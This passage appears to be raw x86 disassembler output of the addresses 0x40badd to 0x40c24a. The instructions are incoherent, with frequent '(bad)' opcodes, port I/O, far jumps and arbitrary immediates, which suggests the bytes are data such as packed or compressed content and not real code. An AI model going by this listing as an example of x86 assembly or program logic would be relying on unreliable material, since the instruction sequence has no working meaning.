  40badd:	mov    bh,0xbe
  40badf:	add    DWORD PTR [ebp-0x359aadf3],eax
  40bae5:	outs   dx,DWORD PTR ds:[esi]
  40bae6:	es jmp 0xf8251905
  40baec:	test   al,0x5a
  40baee:	xchg   ebp,eax
  40baef:	sub    DWORD PTR [esi+0x5488c9d9],ebp
  40baf5:	js     0x40bb3b
  40baf7:	pop    ebx
  40baf8:	aam    0x39
  40bafa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bafb:	mov    dh,BYTE PTR [edi+eiz*8]
  40bafe:	mov    WORD PTR [ebx+0x73],es
  40bb01:	out    0xab,eax
  40bb03:	rol    DWORD PTR [edi],1
  40bb05:	jno    0x40bb77
  40bb07:	fdivr  QWORD PTR [eax+0x7bbcde]
  40bb0d:	add    al,0xb0
  40bb0f:	mov    esi,0xd40ca4ba
  40bb14:	sub    eax,DWORD PTR [edx+0x77]
  40bb17:	cmp    BYTE PTR ds:0x2a8af81f,dh
  40bb1d:	xchg   esp,eax
  40bb1e:	add    DWORD PTR [edx-0x28c3730],ebx
  40bb24:	fwait
  40bb25:	in     al,dx
  40bb26:	and    al,BYTE PTR [eax-0x5c]
  40bb29:	test   DWORD PTR [edx+0x57],0x3eec1a21
  40bb30:	repz call DWORD PTR [ebx]
  40bb33:	retf   0x45be
  40bb36:	push   ds
  40bb37:	sbb    BYTE PTR [ecx+0x577a50ff],bh
  40bb3d:	mov    edx,esi
  40bb3f:	xchg   DWORD PTR [esi+0x7e],edx
  40bb42:	call   0x2efaaaf0
  40bb47:	mov    ebp,esp
  40bb49:	cs xchg ecx,eax
  40bb4b:	adc    DWORD PTR [eax+eiz*8+0x271e1d0],ebx
  40bb52:	aad    0x57
  40bb54:	aam    0xd2
  40bb56:	inc    esp
  40bb57:	loopne 0x40bb24
  40bb59:	(bad)  
  40bb5a:	xor    ecx,edx
  40bb5c:	test   eax,0xd76976f4
  40bb62:	inc    ebp
  40bb63:	inc    eax
  40bb64:	mov    esp,0xd5f5d137
  40bb69:	enter  0x4cc2,0xf7
  40bb6d:	xchg   ebp,eax
  40bb6e:	or     eax,ebx
  40bb70:	cmp    al,ch
  40bb72:	aam    0xc5
  40bb74:	add    eax,ebp
  40bb76:	inc    edx
  40bb77:	dec    esi
  40bb78:	(bad)  
  40bb79:	aad    0xa6
  40bb7b:	dec    esp
  40bb7c:	stos   DWORD PTR es:[edi],eax
  40bb7d:	outs   dx,BYTE PTR ds:[esi]
  40bb7e:	push   cs
  40bb7f:	out    dx,al
  40bb80:	and    DWORD PTR [esi+ebp*4+0x3a3c9f6f],eax
  40bb87:	fnstsw WORD PTR [edx+ecx*8]
  40bb8a:	icebp  
  40bb8b:	push   ecx
  40bb8c:	sbb    bl,BYTE PTR es:[edx]
  40bb8f:	aam    0xa5
  40bb91:	cli    
  40bb92:	xchg   ecx,eax
  40bb93:	and    DWORD PTR [esi+eiz*4+0x7c9f8755],ebx
  40bb9a:	es adc ch,BYTE PTR ss:[edi-0x3e]
  40bb9f:	jo     0x40bbb1
  40bba1:	adc    edx,0x36
  40bba4:	int    0x17
  40bba6:	dec    edx
  40bba7:	rcl    DWORD PTR [edi+ebx*4+0x2],1
  40bbab:	xchg   ebp,eax
  40bbac:	pop    edx
  40bbad:	out    dx,al
  40bbae:	test   DWORD PTR [ebx+0x6a],edi
  40bbb1:	lods   al,BYTE PTR ds:[esi]
  40bbb2:	mul    DWORD PTR [ebx+0x4773ccbc]
  40bbb8:	fdivr  DWORD PTR [eax]
  40bbba:	cmc    
  40bbbb:	pop    esp
  40bbbc:	jmp    0xdc85:0xe0ef6faa
  40bbc3:	fucom  st(6)
  40bbc5:	inc    ebp
  40bbc6:	test   eax,0xf0afd490
  40bbcb:	(bad)  
  40bbcc:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbce:	in     eax,dx
  40bbcf:	enter  0xbfff,0x19
  40bbd3:	pop    esi
  40bbd4:	mov    ch,0x66
  40bbd6:	stos   BYTE PTR es:[edi],al
  40bbd7:	pop    edx
  40bbd8:	stos   DWORD PTR es:[edi],eax
  40bbd9:	xchg   esp,eax
  40bbda:	iret   
  40bbdb:	add    eax,0xe826c078
  40bbe0:	(bad)  
  40bbe1:	lahf   
  40bbe2:	fisubr WORD PTR [edx+0x5da789f5]
  40bbe8:	lods   al,BYTE PTR ds:[esi]
  40bbe9:	inc    ebp
  40bbea:	xor    esp,DWORD PTR [eax-0x4c]
  40bbed:	xor    al,0x81
  40bbef:	fisubr DWORD PTR cs:[ebp-0x52020d76]
  40bbf6:	addr16 jno 0x40bc61
  40bbf9:	shl    DWORD PTR [ecx],0x3
  40bbfc:	xor    DWORD PTR [ebx-0x70f2dea6],edx
  40bc02:	and    eax,0x9e264958
  40bc07:	or     DWORD PTR [esi+0x53343cc6],edi
  40bc0d:	and    BYTE PTR [eax-0x43],dl
  40bc10:	inc    ebp
  40bc11:	lds    esp,FWORD PTR [edx-0x4a]
  40bc14:	jbe    0x40bc08
  40bc16:	cmp    ecx,DWORD PTR [edx+ebp*1]
  40bc19:	mov    BYTE PTR [ecx],ch
  40bc1b:	popf   
  40bc1c:	ds jmp 0xa71:0x8d15a9c6
  40bc24:	loop   0x40bc52
  40bc26:	sub    WORD PTR [ebx-0x18e851fb],cx
  40bc2d:	lahf   
  40bc2e:	push   edi
  40bc2f:	mov    BYTE PTR [esi-0x70],ah
  40bc32:	(bad)  
  40bc33:	fs mov edx,0xab2b623
  40bc39:	pop    edi
  40bc3a:	jno    0x40bc51
  40bc3c:	shr    edx,0xf4
  40bc3f:	stos   DWORD PTR es:[edi],eax
  40bc40:	cmp    eax,0x5f0f36c5
  40bc45:	retf   0x9c75
  40bc48:	xchg   esp,eax
  40bc49:	push   ds
  40bc4a:	mov    dl,0xc2
  40bc4c:	mov    ebx,0xce405f0d
  40bc51:	scas   al,BYTE PTR es:[edi]
  40bc52:	fwait
  40bc53:	fwait
  40bc54:	leave  
  40bc55:	and    dl,BYTE PTR [eax+0x7b]
  40bc58:	mov    fs,WORD PTR [edx+eax*4+0x15]
  40bc5c:	ja     0x40bc5b
  40bc5e:	sbb    BYTE PTR [edi+0x7e1c48df],dl
  40bc64:	and    BYTE PTR [edi+0x3e],ah
  40bc67:	arpl   WORD PTR [ebp+0x6c419bf2],bx
  40bc6d:	cmp    DWORD PTR [ebx-0x2d99ffc1],edx
  40bc73:	jge    0x40bc4d
  40bc75:	xchg   ecx,eax
  40bc76:	jge    0x40bcda
  40bc78:	adc    eax,0xa04052b8
  40bc7d:	sub    DWORD PTR [ebx+0x29360385],ebx
  40bc83:	inc    edi
  40bc84:	pushf  
  40bc85:	jl     0x40bcf4
  40bc87:	int    0x35
  40bc89:	popa   
  40bc8a:	imul   edi,DWORD PTR [edi],0xdaefb152
  40bc90:	mov    al,ds:0xb3c30c0c
  40bc95:	jbe    0x40bc35
  40bc97:	aaa    
  40bc98:	arpl   WORD PTR [ebx],cx
  40bc9a:	mov    cl,0x44
  40bc9c:	cmp    BYTE PTR [eax+0x721c2c96],0x69
  40bca3:	mov    WORD PTR [ebp+0x1317c1a],gs
  40bca9:	cwde   
  40bcaa:	je     0x40bca1
  40bcac:	or     esi,DWORD PTR [edi+edi*8-0x20d9d3a3]
  40bcb3:	sti    
  40bcb4:	aas    
  40bcb5:	shl    dl,1
  40bcb7:	adc    BYTE PTR [edi],cl
  40bcb9:	pop    ebp
  40bcba:	push   edi
  40bcbb:	ins    DWORD PTR es:[edi],dx
  40bcbc:	dec    edi
  40bcbd:	xor    edx,DWORD PTR [eax]
  40bcbf:	inc    ebp
  40bcc0:	and    BYTE PTR [ecx],0xd7
  40bcc3:	jp     0x40bcd9
  40bcc5:	ja     0x40bcc3
  40bcc7:	or     BYTE PTR [esi-0x7894e4c6],0x9b
  40bcce:	mov    ebp,0x876a9f69
  40bcd3:	jb     0x40bd3c
  40bcd5:	push   edi
  40bcd6:	jp     0x40bd36
  40bcd8:	or     eax,0x7a2d58ba
  40bcdd:	pushf  
  40bcde:	and    esp,ebx
  40bce0:	sbb    DWORD PTR [edi],esi
  40bce2:	int3   
  40bce3:	sub    BYTE PTR [ebp+0x33],0x2b
  40bce7:	adc    DWORD PTR [eax+0x2f428034],ebp
  40bced:	idiv   eax
  40bcef:	add    eax,0xb39bb70b
  40bcf4:	sub    DWORD PTR [ebp-0x7dc016c7],esp
  40bcfa:	add    ebp,DWORD PTR [eax]
  40bcfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcfd:	lods   al,BYTE PTR ds:[esi]
  40bcfe:	sbb    ah,cl
  40bd00:	data16 or bh,bl
  40bd03:	inc    esp
  40bd04:	fwait
  40bd05:	loope  0x40bd16
  40bd07:	(bad)
  40bd0a:	pop    eax
  40bd0b:	ins    DWORD PTR es:[edi],dx
  40bd0c:	xor    edi,DWORD PTR [ebx+0x6a7f1ee9]
  40bd12:	xchg   esp,eax
  40bd13:	sub    ecx,DWORD PTR [edx-0x71]
  40bd16:	mov    edi,eax
  40bd18:	xor    ebp,DWORD PTR [ebp+eax*8+0x7984bb6c]
  40bd1f:	fwait
  40bd20:	imul   esp,DWORD PTR [ebx+0x5],0xd081caba
  40bd27:	cmp    al,0xd4
  40bd29:	inc    eax
  40bd2a:	mov    ss,WORD PTR [edx-0x1dd24395]
  40bd30:	or     bh,BYTE PTR [edi+0x74]
  40bd33:	cmp    al,BYTE PTR [eax+eiz*4]
  40bd36:	add    al,0x10
  40bd38:	dec    ecx
  40bd39:	nop
  40bd3a:	or     BYTE PTR [esi-0x73],al
  40bd3d:	pop    esi
  40bd3e:	ror    DWORD PTR [eax-0x7d],cl
  40bd41:	ret    
  40bd42:	mov    edi,0x3c132371
  40bd47:	stos   BYTE PTR es:[edi],al
  40bd48:	(bad)  
  40bd49:	or     al,0xf5
  40bd4b:	clc    
  40bd4c:	fisub  WORD PTR [ebx+ecx*8+0x41bfc438]
  40bd53:	jl     0x40bd53
  40bd55:	call   0xae90:0xb2c653a8
  40bd5c:	fnstenv [eax+0x4c90cf0c]
  40bd62:	mov    al,0xf0
  40bd64:	sbb    eax,0xda47ec1e
  40bd69:	and    DWORD PTR [esi+edx*1+0x63],0x51
  40bd6e:	leave  
  40bd6f:	ins    BYTE PTR es:[edi],dx
  40bd70:	xchg   edx,eax
  40bd71:	mov    ebp,0xce720a48
  40bd76:	sahf   
  40bd77:	popa   
  40bd78:	jmp    0x40bdbd
  40bd7a:	(bad)  
  40bd7b:	stc    
  40bd7c:	mov    cl,0xaa
  40bd7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd7f:	cmp    DWORD PTR [edi-0x41b2167e],edi
  40bd85:	sbb    DWORD PTR [edx],esi
  40bd87:	mov    ecx,0x1856e93c
  40bd8c:	(bad)  
  40bd8d:	fldcw  WORD PTR [esi]
  40bd8f:	hlt    
  40bd90:	push   0xfffffffb
  40bd92:	out    0xca,al
  40bd94:	pop    ebx
  40bd95:	inc    ebx
  40bd96:	jb     0x40bd98
  40bd98:	ret    0x6607
  40bd9b:	add    eax,ecx
  40bd9d:	out    dx,al
  40bd9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd9f:	outs   dx,BYTE PTR ds:[esi]
  40bda0:	mov    ch,0xc6
  40bda2:	jle    0x40bdd2
  40bda4:	shr    BYTE PTR [esi-0x4c39f79],1
  40bdaa:	cmp    al,BYTE PTR [esi-0x7102741d]
  40bdb0:	daa    
  40bdb1:	ja     0x40bde8
  40bdb3:	inc    eax
  40bdb4:	div    DWORD PTR [ecx+0x6f]
  40bdb7:	(bad)  
  40bdb8:	jo     0x40bdaf
  40bdba:	add    eax,DWORD PTR [edi-0x48]
  40bdbd:	fst    QWORD PTR [edi-0x19]
  40bdc0:	sar    DWORD PTR [ecx],1
  40bdc2:	and    eax,0x7d07e062
  40bdc7:	mov    esi,0x19f3c394
  40bdcc:	pop    edx
  40bdcd:	pop    ecx
  40bdce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdcf:	push   edx
  40bdd0:	fistp  DWORD PTR [edi]
  40bdd2:	test   BYTE PTR ds:0xbf2dc19e,ch
  40bdd8:	fwait
  40bdd9:	shl    BYTE PTR [edx-0x65a162df],0x9d
  40bde0:	cmp    dh,BYTE PTR [ecx+0x7ffe0ce7]
  40bde6:	cmp    ebp,DWORD PTR [edi]
  40bde8:	std    
  40bde9:	adc    BYTE PTR [ebx-0x40],dh
  40bdec:	mov    bh,0x3c
  40bdee:	pop    ebx
  40bdef:	out    dx,al
  40bdf0:	fimul  DWORD PTR [esi+0xc5e027e]
  40bdf6:	in     al,dx
  40bdf7:	pop    ecx
  40bdf8:	mov    al,ds:0xdc02b054
  40bdfd:	cmp    DWORD PTR [eax+esi*4-0x27],ebp
  40be01:	jb     0x40be4f
  40be03:	fcom   QWORD PTR [ebp+0x10]
  40be06:	adc    ah,BYTE PTR [ebx-0x70]
  40be09:	rol    esp,1
  40be0b:	or     al,0x58
  40be0d:	(bad)  [esi]
  40be0f:	push   0xd
  40be11:	out    dx,al
  40be12:	mov    BYTE PTR [ebp+0x3f],0x3a
  40be16:	(bad)  
  40be17:	cld    
  40be18:	jecxz  0x40bdf7
  40be1a:	or     bh,BYTE PTR [edi]
  40be1c:	fsubr  QWORD PTR [ebp+0x75ac5794]
  40be22:	mov    WORD PTR [eax-0x5c5cc0e1],?
  40be28:	test   DWORD PTR cs:[esi],ebp
  40be2b:	adc    cl,cl
  40be2d:	mov    edx,0xa0ebaf9e
  40be32:	xor    ecx,DWORD PTR [edi-0x9]
  40be35:	in     al,dx
  40be36:	xchg   esp,eax
  40be37:	sub    esp,ecx
  40be39:	mov    ah,0xcb
  40be3b:	ds pop edx
  40be3d:	lds    ebx,FWORD PTR [edi]
  40be3f:	inc    ebp
  40be40:	adc    al,0xd6
  40be42:	xor    ebp,DWORD PTR [ecx-0x7]
  40be45:	mov    BYTE PTR [esi+0x43294c56],bl
  40be4b:	adc    eax,ebx
  40be4d:	xchg   BYTE PTR [ebp+0x1efe2fa3],dh
  40be53:	dec    esi
  40be54:	div    DWORD PTR [edx+0x1]
  40be57:	jecxz  0x40be02
  40be59:	inc    esp
  40be5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be5b:	cmp    al,BYTE PTR [ecx+0x3f5a8232]
  40be61:	lock test eax,0xb3174fd0
  40be67:	call   DWORD PTR [ebp+0x5754216e]
  40be6d:	ds xchg ebp,eax
  40be6f:	inc    eax
  40be70:	mov    al,ds:0x311cc98d
  40be75:	sub    edx,edi
  40be77:	cmp    al,0x73
  40be79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be7a:	fdivr  QWORD PTR [esi-0x68]
  40be7d:	retf   0xedb9
  40be80:	pop    eax
  40be81:	mov    WORD PTR [ebx+0x9be8c71],?
  40be87:	sbb    esp,DWORD PTR ds:0x36ea4130
  40be8d:	jmp    0x40bebe
  40be8f:	cmp    DWORD PTR [edi],ebx
  40be91:	cmp    al,0xdc
  40be93:	xor    DWORD PTR [ecx-0x26],ecx
  40be96:	pop    ss
  40be97:	inc    esi
  40be98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be99:	push   eax
  40be9a:	mov    BYTE PTR [ebx-0x14],bl
  40be9d:	bound  esp,QWORD PTR ds:0x7be1d06e
  40bea3:	imul   esp,DWORD PTR [edi-0x6e67839f],0x31314181
  40bead:	jne    0x40be4c
  40beaf:	hlt    
  40beb0:	ret    
  40beb1:	inc    DWORD PTR [edi-0x4c]
  40beb4:	mov    dh,0x6c
  40beb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beb7:	retf   
  40beb8:	xchg   esp,eax
  40beb9:	ja     0x40bedd
  40bebb:	add    al,0xec
  40bebd:	adc    DWORD PTR [ebp-0x12],esp
  40bec0:	ret    0x59c1
  40bec3:	popf   
  40bec4:	adc    eax,0xef8a9400
  40bec9:	mov    DWORD PTR [ebx],esp
  40becb:	call   0x215513f7
  40bed0:	push   ecx
  40bed1:	(bad)  
  40bed2:	in     eax,0xd
  40bed4:	popa   
  40bed5:	imul   ebp,DWORD PTR [esi],0x75b5fa4f
  40bedb:	push   esi
  40bedc:	(bad)  
  40bedd:	mov    bl,0x10
  40bedf:	(bad)  
  40bee1:	cmp    al,0x9b
  40bee3:	jmp    FWORD PTR [esp+ebx*1-0x78602fa7]
  40beea:	pushf  
  40beeb:	loope  0x40be7a
  40beed:	jbe    0x40bea1
  40beef:	adc    ecx,DWORD PTR [ecx]
  40bef1:	xor    eax,0xf20599c0
  40bef6:	stos   BYTE PTR es:[edi],al
  40bef7:	stc    
  40bef8:	or     al,0xc
  40befa:	mov    ch,0x4c
  40befc:	sub    DWORD PTR [esi],ebp
  40befe:	(bad)  
  40beff:	mov    bl,0x43
  40bf01:	test   eax,0x2e548f25
  40bf06:	jge    0x40bf2f
  40bf08:	and    al,0x83
  40bf0a:	sbb    BYTE PTR [ecx+0x2f],al
  40bf0d:	loopne 0x40bf56
  40bf0f:	mov    esi,0xe7cf8501
  40bf14:	and    al,0xa8
  40bf16:	xchg   esi,eax
  40bf17:	arpl   WORD PTR [ecx+0x32],ax
  40bf1a:	jno    0x40bf64
  40bf1c:	mov    eax,0xb18137b
  40bf21:	call   0x3e72:0xd1c9a0f6
  40bf28:	test   eax,0xe79768cf
  40bf2d:	mov    bp,0x198b
  40bf31:	sbb    eax,0x3793ff0
  40bf36:	jmp    0x4881:0x1153b545
  40bf3d:	adc    eax,0x4936f3a1
  40bf42:	adc    ax,0x4f63
  40bf46:	xchg   BYTE PTR [edi+0x5a],bl
  40bf49:	jns    0x40bed9
  40bf4b:	push   edi
  40bf4c:	mov    ebp,0x42c8924
  40bf51:	jnp    0x40bf41
  40bf53:	mov    edi,0x2ac52176
  40bf58:	add    DWORD PTR [ebp+0x2e5227d4],ecx
  40bf5e:	icebp  
  40bf5f:	int3   
  40bf60:	push   0x7b
  40bf62:	xchg   esi,eax
  40bf63:	xor    DWORD PTR [eax],ecx
  40bf65:	dec    edi
  40bf66:	iret   
  40bf67:	inc    edi
  40bf68:	adc    al,0xa8
  40bf6a:	or     eax,0xa1c20229
  40bf6f:	std    
  40bf70:	mov    al,ds:0xc9589f37
  40bf75:	aas    
  40bf76:	int3   
  40bf77:	sub    dl,BYTE PTR [ecx]
  40bf79:	mov    bh,0x40
  40bf7b:	sahf   
  40bf7c:	cmp    BYTE PTR [eax],bh
  40bf7e:	gs int 0xdb
  40bf81:	imul   esi,DWORD PTR [edx+0x6b],0xbd6cd655
  40bf88:	inc    edi
  40bf89:	lock push 0x7ba0218d
  40bf8f:	test   BYTE PTR [eax-0x1e],cl
  40bf92:	loop   0x40bfcf
  40bf94:	mov    bh,0x35
  40bf96:	mov    esi,0x95f9bea1
  40bf9b:	xor    bh,dl
  40bf9d:	cs mov esi,0x60fc5ec2
  40bfa3:	repnz cmc 
  40bfa5:	outs   dx,DWORD PTR ds:[esi]
  40bfa6:	inc    eax
  40bfa7:	pusha  
  40bfa8:	xor    esi,DWORD PTR [edx+edi*2]
  40bfab:	pop    edx
  40bfac:	call   0x7fc6:0x3c495897
  40bfb3:	jecxz  0x40bf7c
  40bfb5:	pop    edi
  40bfb6:	cmp    eax,0xd3aa4d59
  40bfbb:	call   0x5128566b
  40bfc0:	sbb    esp,esi
  40bfc2:	inc    ebx
  40bfc3:	rcl    dl,1
  40bfc5:	mov    al,ds:0x13248753
  40bfca:	(bad)  
  40bfcc:	popf   
  40bfcd:	jp     0x40bf9d
  40bfcf:	iret   
  40bfd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfd1:	sar    edi,1
  40bfd3:	inc    ecx
  40bfd4:	test   al,0x83
  40bfd6:	jbe    0x40c004
  40bfd8:	xchg   esi,eax
  40bfd9:	dec    esp
  40bfda:	dec    esi
  40bfdb:	xchg   ebx,eax
  40bfdc:	jp     0x40bff9
  40bfde:	and    al,0x9c
  40bfe0:	dec    esp
  40bfe1:	cdq    
  40bfe2:	das    
  40bfe3:	pop    ecx
  40bfe4:	fmul   DWORD PTR [ecx-0x60b1e6a6]
  40bfea:	(bad)  
  40bfeb:	mov    al,0xdc
  40bfed:	repnz sub edx,ecx
  40bff0:	jnp    0x40bfa5
  40bff2:	ins    BYTE PTR es:[edi],dx
  40bff3:	mov    esp,0x11de9118
  40bff8:	shr    BYTE PTR [eax],cl
  40bffa:	xlat   BYTE PTR ds:[ebx]
  40bffb:	pop    es
  40bffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bffd:	push   edx
  40bffe:	shl    BYTE PTR [ecx],1
  40c000:	cmp    al,0x5c
  40c002:	test   WORD PTR [ebp+0x255d2c0c],bp
  40c009:	or     eax,0x58c55f8e
  40c00e:	or     eax,0x4daef6cf
  40c013:	out    dx,eax
  40c014:	sub    DWORD PTR [ebp+0x5f],0x987546a4
  40c01b:	loopne 0x40c04d
  40c01d:	cmp    dh,BYTE PTR [edi]
  40c01f:	ins    BYTE PTR es:[edi],dx
  40c020:	push   DWORD PTR [eax+0x26967b00]
  40c026:	xor    BYTE PTR [edi],0xaf
  40c029:	add    esi,ebp
  40c02b:	lods   eax,DWORD PTR ds:[esi]
  40c02c:	push   ds
  40c02d:	sti    
  40c02e:	fcom   DWORD PTR [ecx]
  40c030:	pop    esi
  40c031:	dec    edi
  40c032:	fadd   QWORD PTR [eax-0x68e20deb]
  40c038:	jnp    0x40c015
  40c03a:	stos   BYTE PTR es:[edi],al
  40c03b:	mov    ebp,0xc9daa711
  40c040:	mov    ebx,0x53b6521
  40c045:	je     0x40c056
  40c047:	lods   al,BYTE PTR es:[esi]
  40c049:	lahf   
  40c04a:	dec    ecx
  40c04b:	jmp    0x40c056
  40c04d:	shr    DWORD PTR [ebx+0x7b62d8a1],cl
  40c053:	fwait
  40c054:	xor    edi,DWORD PTR [edx]
  40c056:	inc    edi
  40c057:	test   eax,0x92d437ca
  40c05c:	xchg   ebx,eax
  40c05d:	loopne 0x40c00d
  40c05f:	popf   
  40c060:	xor    ebp,0x1c0fb409
  40c066:	and    ch,al
  40c068:	pop    ss
  40c069:	repz pusha 
  40c06b:	jae    0x40c031
  40c06d:	adc    eax,DWORD PTR [edx]
  40c06f:	adc    BYTE PTR [esp+edi*1],dl
  40c072:	and    BYTE PTR [esi],bl
  40c074:	test   ax,0xf715
  40c078:	push   ebx
  40c079:	or     ah,BYTE PTR [eax+0x48]
  40c07c:	test   eax,0x578abc6
  40c081:	mov    ebx,0xfaa14855
  40c086:	jae    0x40c0e7
  40c088:	inc    esp
  40c089:	mov    dl,al
  40c08b:	dec    BYTE PTR [edi+0x35ad9e86]
  40c091:	and    edi,DWORD PTR [edi]
  40c093:	jno    0x40c09c
  40c095:	and    al,0xf8
  40c097:	ins    BYTE PTR es:[edi],dx
  40c098:	cli    
  40c099:	les    esp,FWORD PTR ds:0x896c6cd1
  40c09f:	mov    cl,0x90
  40c0a1:	sti    
  40c0a2:	and    BYTE PTR [ebp+edi*4+0x3c],ah
  40c0a6:	jb     0x40c06a
  40c0a8:	add    bl,bh
  40c0aa:	in     eax,0x1a
  40c0ac:	xor    DWORD PTR [ebx+0x61],ebp
  40c0af:	nop
  40c0b0:	jo     0x40c084
  40c0b2:	sahf   
  40c0b3:	jns    0x40c11c
  40c0b5:	sub    dh,BYTE PTR [eax+0x52]
  40c0b8:	mov    BYTE PTR [edi-0x66],dh
  40c0bb:	inc    esi
  40c0bc:	les    esi,FWORD PTR [ecx+0x15]
  40c0bf:	or     BYTE PTR [ebx-0x29],dh
  40c0c2:	adc    ecx,DWORD PTR [edx]
  40c0c4:	imul   edi,DWORD PTR [ecx],0x10b19d2c
  40c0ca:	pop    eax
  40c0cb:	outs   dx,DWORD PTR ds:[esi]
  40c0cc:	push   0x63c55b8c
  40c0d1:	cld    
  40c0d2:	adc    ah,dh
  40c0d4:	or     di,sp
  40c0d7:	add    cx,0x118
  40c0dc:	sbb    eax,0xd0297b92
  40c0e1:	into   
  40c0e2:	fisttp DWORD PTR [esi+0x3a]
  40c0e5:	loopne 0x40c129
  40c0e7:	test   dl,bl
  40c0e9:	jp     0x40c0e3
  40c0eb:	test   eax,0x4346ed5e
  40c0f0:	iret   
  40c0f1:	(bad)  
  40c0f2:	fwait
  40c0f3:	sahf   
  40c0f4:	pop    eax
  40c0f5:	jnp    0x40c0f4
  40c0f7:	sbb    esp,DWORD PTR [eax]
  40c0f9:	push   eax
  40c0fa:	mov    dh,0x5c
  40c0fc:	dec    ecx
  40c0fd:	stos   BYTE PTR es:[edi],al
  40c0fe:	enter  0xc7ac,0xd9
  40c102:	lods   al,BYTE PTR ds:[esi]
  40c103:	in     al,0x35
  40c105:	(bad)  ds:0x94b35261
  40c10b:	or     BYTE PTR [ebx+eiz*8-0xb],bl
  40c10f:	shl    al,0x9e
  40c112:	mov    ch,0x8e
  40c114:	clc    
  40c115:	stos   BYTE PTR es:[edi],al
  40c116:	jmp    0x4dd6bb06
  40c11b:	sbb    DWORD PTR [esi-0x50],ebp
  40c11e:	xchg   edi,eax
  40c11f:	push   ss
  40c120:	jns    0x40c10b
  40c122:	mov    esi,0xd73d3e4d
  40c127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c128:	test   BYTE PTR [ecx-0xb43a89f],bl
  40c12e:	dec    esi
  40c12f:	pop    esp
  40c130:	xor    ah,BYTE PTR [eax+0x8]
  40c133:	ret    
  40c134:	mov    dh,0xa1
  40c136:	enter  0x45c5,0xd8
  40c13a:	mov    ch,0x82
  40c13c:	xchg   ecx,eax
  40c13d:	in     al,0x6d
  40c13f:	push   cs
  40c140:	sti    
  40c141:	(bad)  
  40c142:	xor    ah,BYTE PTR [ebp+0x16]
  40c145:	jbe    0x40c1b1
  40c147:	ins    DWORD PTR es:[edi],dx
  40c148:	cmc    
  40c149:	(bad)  [eax*8-0x7ef5ec84]
  40c150:	or     al,0xfa
  40c152:	ja     0x40c12d
  40c154:	or     BYTE PTR [ebx-0x41084867],ah
  40c15a:	push   ebp
  40c15b:	std    
  40c15c:	mov    ds:0xe34f4d90,al
  40c161:	mov    edx,0xa174ced6
  40c166:	js     0x40c112
  40c168:	xor    eax,0x4f17940e
  40c16d:	mov    bh,0x5e
  40c16f:	jbe    0x40c1dd
  40c171:	push   ebp
  40c172:	in     eax,0x63
  40c174:	and    DWORD PTR ds:0x14176c13,ebp
  40c17a:	mov    eax,ds:0x63684406
  40c17f:	cmp    BYTE PTR [ecx],0x22
  40c182:	push   ss
  40c183:	jno    0x40c173
  40c185:	retf   0x8a75
  40c188:	mov    ds:0xd5e9c1ed,eax
  40c18d:	scas   al,BYTE PTR es:[edi]
  40c18e:	sub    eax,DWORD PTR [eax]
  40c190:	mov    fs,WORD PTR [ebx]
  40c192:	cmp    dl,BYTE PTR [eax+0x67fa2c38]
  40c198:	and    ebp,DWORD PTR [ebx]
  40c19a:	mov    al,ds:0xa9cf4415
  40c19f:	mov    ah,0xce
  40c1a1:	clc    
  40c1a2:	scas   al,BYTE PTR es:[edi]
  40c1a3:	pusha  
  40c1a4:	pop    eax
  40c1a5:	mov    ah,0x77
  40c1a7:	ds jns 0x40c156
  40c1aa:	push   ecx
  40c1ab:	adc    al,0x4d
  40c1ad:	dec    eax
  40c1ae:	pop    ebx
  40c1af:	icebp  
  40c1b0:	xchg   ebp,eax
  40c1b1:	mov    cl,BYTE PTR [ebx+0x7b]
  40c1b4:	in     eax,dx
  40c1b5:	mov    ah,0xbf
  40c1b7:	cmp    eax,0x6152627b
  40c1bc:	push   edx
  40c1bd:	mov    DWORD PTR [eax],eax
  40c1bf:	mov    ch,0x16
  40c1c1:	jmp    0xf39ceef7
  40c1c6:	mov    ebp,0x62a29c5d
  40c1cb:	push   esp
  40c1cc:	data16 hlt 
  40c1ce:	arpl   di,bp
  40c1d0:	clc    
  40c1d1:	mov    ds:0xf9958b00,eax
  40c1d6:	cmp    al,0x4e
  40c1d8:	push   0xc52a5021
  40c1dd:	jne    0x40c162
  40c1df:	mov    eax,ds:0x7fd16402
  40c1e4:	data16 jno 0x40c217
  40c1e7:	fcomp  DWORD PTR [eax-0x6335bdda]
  40c1ed:	icebp  
  40c1ee:	inc    esp
  40c1ef:	dec    ebp
  40c1f0:	push   edi
  40c1f1:	sub    ecx,DWORD PTR [ecx]
  40c1f3:	or     BYTE PTR [eax+0x73],0x5a
  40c1f7:	fidiv  DWORD PTR [esi+0x6975923b]
  40c1fd:	rcl    DWORD PTR [esi],0x41
  40c200:	mov    eax,ds:0x5d76b528
  40c205:	push   cs
  40c206:	mov    ebp,DWORD PTR [ebx]
  40c208:	xchg   al,bh
  40c20a:	leave  
  40c20b:	dec    edx
  40c20c:	retf   0xc50f
  40c20f:	sbb    BYTE PTR [edx-0x12],dh
  40c212:	scas   eax,DWORD PTR es:[edi]
  40c213:	or     ecx,DWORD PTR [ebx]
  40c215:	jge    0x40c238
  40c217:	sbb    edi,DWORD PTR [ecx+0x78]
  40c21a:	lods   al,BYTE PTR ds:[esi]
  40c21b:	popf   
  40c21c:	sbb    DWORD PTR fs:[edi],esi
  40c21f:	mov    ds:0xf1c4c764,al
  40c224:	sub    DWORD PTR [edx-0x69],edi
  40c227:	xor    ebp,DWORD PTR [edx]
  40c229:	fsubr  DWORD PTR [esi+0x1f6ba4b2]
  40c22f:	dec    edi
  40c230:	mov    ebp,0x73cc1f23
  40c235:	lods   al,BYTE PTR ds:[esi]
  40c236:	pop    ds
  40c237:	clc    
  40c238:	addr16 sub eax,0xe3931589
  40c23e:	imul   esp,eax,0xc0bc8735
  40c244:	lock test eax,0xe642457f
  40c24a:	inc    ecx
